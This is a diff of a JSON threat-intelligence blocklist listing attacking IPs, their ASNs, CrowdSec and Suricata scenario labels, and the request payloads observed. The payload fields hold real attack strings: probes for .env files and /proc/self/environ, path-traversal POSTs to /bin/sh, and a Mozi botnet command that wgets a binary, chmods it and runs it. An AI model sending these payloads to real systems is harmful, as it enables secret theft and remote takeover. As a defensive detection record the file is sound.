@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-10-27T13:00:00Z",
+  "generated_at": "2026-10-28T01:00:00Z",
   "ttl_days": 7,
   "scope": "all",
   "counts": {
-    "total": 1407,
-    "v4": 1407,
+    "total": 1412,
+    "v4": 1412,
     "v6": 0
   },
   "items": [
@@ -396,52 +396,6 @@
       ]
     },
     {
-      "ip": "34.75.16.222",
-      "family": "v4",
-      "first_seen": "2026-10-20T05:00:00Z",
-      "last_seen": "2026-10-20T13:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-bad-user-agent",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-dos-swithcing-ua",
-        "crowdsec/http-path-traversal-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.75.16.0/20",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /admin/.env",
-        "GET /z9x8c7v6b5-debug-trigger-salledarcade.fr",
-        "GET /api/system/fileView?file=/proc/self/environ",
-        "GET /@fs/.env?url&raw??",
-        "GET /@fs/.env?import&?raw??",
-        "GET /api/uploads/..%2F..%2F..%2F.env",
-        "GET /@fs/app/.env.local?import&raw??",
-        "GET /@fs/app/.env.production?import&raw??",
-        "GET /@fs/.env?raw&url??",
-        "GET /65vkzjpbgxul34afig98",
-        "GET /yy2suxyjg9hsfe31paga",
-        "GET /static/.env",
-        "GET /build../.env",
-        "GET /media../.env",
-        "GET /css../.env",
-        "GET /static../.env",
-        "GET /uploads../.env",
-        "GET /",
-        "GET /robots.txt",
-        "POST /graphql"
-      ]
-    },
-    {
       "ip": "159.203.184.112",
       "family": "v4",
       "first_seen": "2026-10-20T06:00:00Z",
@@ -475,24 +429,6 @@
       "asn_prefix": "160.154.31.0/24",
       "payloads": [
         "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
-      ]
-    },
-    {
-      "ip": "181.204.5.146",
-      "family": "v4",
-      "first_seen": "2026-10-20T17:00:00Z",
-      "last_seen": "2026-10-20T17:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "13489",
-      "asn_name": "AS13489 - UNE EPM TELECOMUNICACIONES S.A.",
-      "asn_prefix": "181.204.0.0/14",
-      "payloads": [
-        "GET /manager/html"
       ]
     },
     {
@@ -23259,6 +23195,7 @@
         "crowdsec"
       ],
       "asn": "60982",
+      "asn_name": "XZONE X-ZONE IT SRL",
       "asn_prefix": "64.205.112.0/24",
       "payloads": [
         "GET /hinfofuns.php",
@@ -23373,6 +23310,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "216.180.246.0/24",
       "payloads": [
         "GET /admin/index.html",
         "GET /+CSCOE+/logon.html",
@@ -23471,7 +23411,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "7488",
+      "asn_name": "CNSERVER-AP-AS - CNServer LLC",
+      "asn_prefix": "50.114.236.0/24"
     },
     {
       "ip": "20.102.109.125",
@@ -23484,12 +23427,139 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
       "payloads": [
         "GET /"
       ]
+    },
+    {
+      "ip": "143.198.93.210",
+      "family": "v4",
+      "first_seen": "2026-10-27T21:00:00Z",
+      "last_seen": "2026-10-27T21:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "143.198.80.0/20",
+      "payloads": [
+        "GET /images/images/cache.php",
+        "GET /cgi-bin/cgi-bin/cgi-bin/cgi-bin/cache.php"
+      ]
+    },
+    {
+      "ip": "66.132.159.114",
+      "family": "v4",
+      "first_seen": "2026-10-27T20:00:00Z",
+      "last_seen": "2026-10-27T20:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "398324",
+      "asn_name": "CENSYS-ARIN-01 - Censys, Inc.",
+      "asn_prefix": "66.132.159.0/24",
+      "tags": [
+        "mwl:scanner=\"censys\""
+      ],
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "66.132.195.96",
+      "family": "v4",
+      "first_seen": "2026-10-27T17:00:00Z",
+      "last_seen": "2026-10-27T17:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "398324",
+      "asn_name": "CENSYS-ARIN-01 - Censys, Inc.",
+      "asn_prefix": "66.132.195.0/24",
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "47.184.58.103",
+      "family": "v4",
+      "first_seen": "2026-10-27T21:00:00Z",
+      "last_seen": "2026-10-27T21:00:00Z",
+      "scenarios": [
+        "suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "5650",
+      "asn_name": "FRONTIER-FRTR - Frontier Communications of America, Inc.",
+      "asn_prefix": "47.184.0.0/14",
+      "payloads": [
+        "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
+      ]
+    },
+    {
+      "ip": "85.11.167.38",
+      "family": "v4",
+      "first_seen": "2026-10-27T17:00:00Z",
+      "last_seen": "2026-10-27T17:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 16"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "197170",
+      "asn_name": "TECHTIES-AS TechTies Inc.",
+      "asn_prefix": "85.11.167.0/24"
+    },
+    {
+      "ip": "110.38.12.14",
+      "family": "v4",
+      "first_seen": "2026-10-27T16:00:00Z",
+      "last_seen": "2026-10-27T16:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "38264",
+      "asn_prefix": "110.38.12.0/22",
+      "payloads": [
+        "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
+      ]
+    },
+    {
+      "ip": "91.214.191.234",
+      "family": "v4",
+      "first_seen": "2026-10-27T22:00:00Z",
+      "last_seen": "2026-10-27T22:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Relay/Router (Not Exit) Node Traffic group 628"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "29222",
+      "asn_prefix": "91.214.188.0/22"
     }
   ]
 }
